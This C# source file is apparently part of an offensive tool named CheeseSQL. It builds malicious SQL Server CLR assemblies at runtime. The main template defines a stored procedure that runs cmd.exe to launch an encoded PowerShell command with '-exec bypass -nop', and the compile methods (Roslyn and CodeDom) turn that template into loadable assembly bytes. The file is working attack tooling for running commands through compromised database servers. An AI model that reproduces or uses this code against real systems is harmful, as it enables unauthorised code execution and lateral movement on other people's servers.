using Microsoft.CodeAnalysis;
using Microsoft.CodeAnalysis.CSharp;
using Microsoft.CodeAnalysis.Emit;
using Microsoft.CodeAnalysis.Text;
using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Text;

namespace CheeseSQL.Helpers
{
    class AssemblyCompiler
    {

        public static string template = @"
using Microsoft.SqlServer.Server;
using System.Diagnostics;

public class ClassName
{
    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void MethodName(string command)
    {
        Process proc = new Process();
        proc.StartInfo.FileName = ""C:\\Windows\\System32\\cmd.exe"";
        proc.StartInfo.Arguments = $""/c start /B powershell -exec bypass -nop -enc {command}"";
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.Start();
        proc.WaitForExit();
        proc.Close();
    }
}; ";


        public static string test_template = @"
using System.Diagnostics;
using System.IO;

public class ClassName
{
    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void MethodName(string command)
    {
        File.WriteAllText(""C:\\Users\\Public\\test.txt"", command);
    }
}; ";

        private static readonly IEnumerable<string> DefaultNamespaces =
            new[]
            {
                "System",
                "System.IO",
                "System.Diagnostics",
                "System.Text",
                "System.Collections.Generic"
            };

        private static readonly CSharpCompilationOptions DefaultCompilationOptions =
            new CSharpCompilationOptions(OutputKind.DynamicallyLinkedLibrary)
                    .WithOverflowChecks(true).WithOptimizationLevel(OptimizationLevel.Release)
                    .WithUsings(DefaultNamespaces);

        private static IEnumerable<MetadataReference> GetAssemblyReferences()
        {
            var references = new MetadataReference[]
            {
                MetadataReference.CreateFromFile(typeof(object).GetTypeInfo().Assembly.Location),
                MetadataReference.CreateFromFile(Path.Combine(typeof(object).GetTypeInfo().Assembly.Location, "..", "mscorlib.dll")),
                MetadataReference.CreateFromFile(Path.Combine(typeof(object).GetTypeInfo().Assembly.Location, "..", "Microsoft.CSharp.dll")),
                MetadataReference.CreateFromFile(Path.Combine(typeof(object).GetTypeInfo().Assembly.Location, "..", "System.Data.dll")),
                MetadataReference.CreateFromFile(Path.Combine(typeof(object).GetTypeInfo().Assembly.Location, "..", "System.Net.dll")),
                MetadataReference.CreateFromFile(Path.Combine(typeof(object).GetTypeInfo().Assembly.Location, "..", "System.Xml.dll")),
                MetadataReference.CreateFromFile(Path.Combine(typeof(object).GetTypeInfo().Assembly.Location, "..", "System.dll")),
                MetadataReference.CreateFromFile(Path.Combine(typeof(object).GetTypeInfo().Assembly.Location, "..", "System.Diagnostics.Process.dll")),
            };
            return references;
        }

        public static SyntaxTree Parse(string text, string filename = "", CSharpParseOptions options = null)
        {
            var stringText = SourceText.From(text, Encoding.UTF8);
            return SyntaxFactory.ParseSyntaxTree(stringText, options, filename);
        }

        public static byte[] compileWithRoselyn(string className, string methodName, string assemblyName = null)
        {
            if (assemblyName == null)
            {
                assemblyName = Guid.NewGuid().ToString();
            }
            Console.WriteLine("  [*] Generating template");
            string payload = template.Replace("ClassName", className).Replace("MethodName", methodName);
            Console.WriteLine("  [*] Parsing source code");
            var parsedSyntaxTree = Parse(payload, "", CSharpParseOptions.Default.WithLanguageVersion(LanguageVersion.CSharp8));

            Console.WriteLine("  [*] Creating compilation");

            var _compilation = CSharpCompilation.Create(assemblyName, new SyntaxTree[] { parsedSyntaxTree }, GetAssemblyReferences(), DefaultCompilationOptions);


            using (var ms = new MemoryStream())
            {
                Console.WriteLine("  [*] Compiling...");

                EmitResult result = _compilation.Emit(ms);
                if (!result.Success)
                {
                    Console.WriteLine("  [-] Error: {0}", String.Join("\n", result.Diagnostics));
                    return null;
                };
                ms.Seek(0, SeekOrigin.Begin);
                return ms.ToArray();
            }

        }


        public static Assembly compile(string className, string methodName)
        {

            CSharpCodeProvider provider = new CSharpCodeProvider();
            CompilerParameters parameters = new CompilerParameters();
            parameters.CompilerOptions = "/unsafe";
            parameters.CompilerOptions = "/optimize";
            parameters.GenerateInMemory = true;
            parameters.TreatWarningsAsErrors = false;
            parameters.GenerateExecutable = false;

            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Core.dll");
            parameters.ReferencedAssemblies.Add("System.Net.Http.dll");
            parameters.ReferencedAssemblies.Add("Microsoft.CSharp.dll");
            parameters.ReferencedAssemblies.Add("System.Data.dll");
            parameters.ReferencedAssemblies.Add("System.Data.DataSetExtensions.dll");
            parameters.ReferencedAssemblies.Add("System.Xml.dll");
            parameters.ReferencedAssemblies.Add("System.Xml.Linq.dll");

            string currentDirectory = System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetEntryAssembly().Location);

            string[] payload = template.Replace("ClassName", className).Replace("MethodName", methodName).Split(Environment.NewLine.ToCharArray());

            CompilerResults results = provider.CompileAssemblyFromSource(parameters, payload);
            if (results.Errors.HasErrors)
            {
                StringBuilder sb = new StringBuilder();

                foreach (CompilerError error in results.Errors)
                {
                    sb.AppendLine(String.Format("Error ({0}): {1}: {2}", error.ErrorNumber, error.ErrorText, error.Line));
                }

                throw new InvalidOperationException(sb.ToString());
            }

            Assembly _compiled = results.CompiledAssembly;

            return _compiled;
        }
    }
}
